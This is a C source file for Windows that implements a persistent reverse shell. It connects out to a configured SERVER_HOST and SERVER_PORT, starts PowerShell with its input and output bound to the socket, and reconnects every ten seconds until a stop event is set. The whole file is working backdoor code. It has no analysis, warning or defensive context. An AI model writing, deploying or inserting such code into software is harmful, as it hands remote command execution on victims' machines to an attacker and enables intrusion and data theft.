#include "shell.h"

#include <stdbool.h>
#include <winsock2.h>
#include <ws2tcpip.h>

#define SIGNALLED(object) (WaitForSingleObject(object, 0) == WAIT_OBJECT_0)

static bool interruptible_sleep(unsigned long long ms, HANDLE interrupt_event);

void shell(HANDLE stop_event) {
    ADDRINFOW *addr_list = NULL,
               hints = {
        .ai_family   = AF_UNSPEC,
        .ai_socktype = SOCK_STREAM,
        .ai_protocol = IPPROTO_TCP
    };

    // GetAddrInfoW gives a linked list of ADDRINFOW structs, one for each addr
    // that matches its first two arguments, subject to restrictions imposed by
    // hints. there may be multiple ADDRINFOW structs given as the host may be
    // multihomed, accessible over multiple protocols, etc
    if (GetAddrInfoW(SERVER_HOST, SERVER_PORT, &hints, &addr_list) != 0) {
        return;
    }

    while (!SIGNALLED(stop_event)) {
        // try to connect to each of the addresses given by GetAddrInfoW
        SOCKET sock;
        for (ADDRINFOW *addr = addr_list; addr != NULL; addr = addr->ai_next) {
            sock = WSASocket(addr->ai_family, addr->ai_socktype, addr->ai_protocol,
                             NULL, 0, 0);

            if (connect(sock, addr->ai_addr, addr->ai_addrlen) == SOCKET_ERROR) {
                closesocket(sock);
                sock = INVALID_SOCKET;
            } else {
                break; // stop trying addresses
            }
        }
        if (sock == INVALID_SOCKET) {
            interruptible_sleep(10000, stop_event);
            continue;
        }
        // connected to server

        STARTUPINFOW si = {
            sizeof (si),
            .dwFlags    = STARTF_USESTDHANDLES,
            .hStdInput  = (HANDLE)sock,
            .hStdOutput = (HANDLE)sock,
            .hStdError  = (HANDLE)sock
        };

        PROCESS_INFORMATION pi;
        CreateProcessW(L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                       NULL, NULL, NULL, TRUE, 0, NULL, L"C:\\", &si, &pi);

        // shell spawned, now wait for either stop_event or the closure of the socket

        HANDLE wait_events[] = {WSACreateEvent(), stop_event};
        WSAEventSelect(sock, wait_events[0], FD_CLOSE); // event to signal if socket is closed

        DWORD signalled_index = WaitForMultipleObjects(ARRAYSIZE(wait_events), wait_events, FALSE, INFINITE);
        WSACloseEvent(wait_events[0]);

        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        closesocket(sock);

        if (signalled_index == 0) {
            // trigger was the socket closing
            // wait before attempting to reconnect
            interruptible_sleep(10000, stop_event);
        }
    }

    FreeAddrInfoW(addr_list);
}

bool interruptible_sleep(unsigned long long ms, HANDLE interrupt_event) {
    LARGE_INTEGER due_time;
    due_time.QuadPart = ms * -10000LL; // convert ms to 100 ns invervals

    HANDLE timer = CreateWaitableTimerW(NULL, TRUE, NULL);
    SetWaitableTimer(timer, &due_time, 0, NULL, NULL, 0);

    DWORD signalled_index = WaitForMultipleObjects(2, (HANDLE[]){timer, interrupt_event}, FALSE, INFINITE)
                            + WAIT_OBJECT_0;
    CloseHandle(timer);
    return signalled_index; // 0 - timer; 1 - interrupt event
}
